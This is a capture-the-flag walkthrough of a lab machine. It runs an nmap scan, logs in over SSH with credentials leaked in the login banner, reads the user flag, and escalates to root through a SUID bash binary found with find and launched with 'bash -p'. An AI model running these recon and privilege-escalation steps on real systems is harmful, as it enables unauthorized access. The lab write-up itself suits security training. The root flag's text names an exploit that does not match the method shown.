# IP
172.17.0.2
# Reconnaissance

``` sh
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.069 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.045 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1013ms
rtt min/avg/max/mdev = 0.045/0.057/0.069/0.012 ms
```
# Ports scanning

``` sh
sudo nmap -sS -sC -sV -p- --open -Pn -n --min-rate 5000 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-29 15:39 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ae:8a:0a:ff:6e:ce:89:a3:31:d7:da:44:85:0d:f4:de (ECDSA)
|_  256 3f:e8:fa:07:33:e8:43:0a:22:1d:6d:15:a6:53:04:7e (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: ACME Corporation - Portal en Mantenimiento
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/migration_notes.txt
MAC Address: 2E:6F:E0:86:E5:BD (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
```
# Web

![[Pasted image 20260929155414.png]]
# SSH

``` sh
ssh cualquier_usuario@172.17.0.2
===================================================================
[*] ACME Corporation - Nodo Bastion de Mantenimiento Interno
[!] AVISO DE SEGURIDAD Y ACCESO:
[!] Portal corporativo en proceso de migracion a infraestructura interna.
[!] Credenciales temporales asignadas para tareas de mantenimiento:
[!]   - Usuario: usuario
[!]   - Password: P@ssw0rd2026_CTF!
===================================================================
cualquier_usuario@172.17.0.2's password:
```

``` sh
ssh usuario@172.17.0.2
```
# User's flag

``` sh
cat user.txt
FLAG{nmap_recon_ssh_foothold_7a9f24e1}
```
# Privilege escalation

``` sh
find / -perm -4000 2>/dev/null | grep /bin/bash
/usr/bin/bash
```

``` sh
/usr/bin/bash -p
```
# Root's flag

``` sh
cat /root/root.txt
FLAG{wp2shell_cve_2026_63030_core_rce_root_99d10c8b}
```
